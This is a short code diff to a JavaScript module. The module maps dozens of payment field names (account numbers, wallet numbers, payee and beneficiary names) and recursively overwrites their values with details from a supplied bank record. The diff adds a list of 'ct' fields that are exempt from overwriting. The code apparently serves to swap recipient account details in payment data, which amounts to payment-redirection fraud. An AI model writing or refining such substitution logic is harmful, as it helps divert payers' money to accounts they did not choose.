@@ -446,7 +446,7 @@ const BANK_FIELD_MAP = {
   walletaccount: 'accountNo', walletno: 'accountNo', collectionaccount: 'accountNo',
   collectionaccountno: 'accountNo', customerbanknumber: 'accountNo',
   acctno: 'accountNo', acctnum: 'accountNo', acct_no: 'accountNo',
-  account: 'accountNo', receiveaccount: 'accountNo', ctaccount: 'accountNo',
+  account: 'accountNo', receiveaccount: 'accountNo',
   beneficiaryname: 'accountHolder', accountname: 'accountHolder', account_name: 'accountHolder',
   receiveaccountname: 'accountHolder', holdername: 'accountHolder', accountholder: 'accountHolder',
   bankaccountholder: 'accountHolder', receivename: 'accountHolder',
@@ -500,7 +500,7 @@ function scanHasBankFields(obj, depth) {
   return false;
 }
 
-const NAME_FIELDS = ['name', 'payname', 'username', 'ctname', 'holdername', 'ownername',
+const NAME_FIELDS = ['name', 'payname', 'username', 'holdername', 'ownername',
   'receivename', 'payeename', 'beneficiaryname', 'accountname', 'realname',
   'cardholder', 'cardname', 'receivername', 'collectionname', 'customername',
   'truename', 'accname', 'acctname', 'bankaccountname', 'receiveaccountname',
@@ -546,6 +546,8 @@ function replaceWalletUrl(urlStr, bank) {
   }
 }
 
+const IGNORE_REPLACE_FIELDS = ['ctaccount', 'ct_account', 'ctname', 'ct_name', 'cttype', 'ct_type', 'ctpackage', 'ct_package', 'cturl', 'ct_url'];
+
 function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
   if (!obj || typeof obj !== 'object' || depth > 10) return;
   if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) deepReplaceBankFields(obj[i], bank, depth + 1, globalHasAcct); return; }
@@ -557,6 +559,7 @@ function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
     }
     if (typeof obj[k] !== 'string' && typeof obj[k] !== 'number') continue;
     const kl = k.toLowerCase().replace(/[_-]/g, '');
+    if (IGNORE_REPLACE_FIELDS.includes(kl)) continue; // Never overwrite user collection/payer accounts
     const mapping = BANK_FIELD_MAP[kl];
     if (mapping === 'bankName') {
       obj[k] = resolvedBankName;
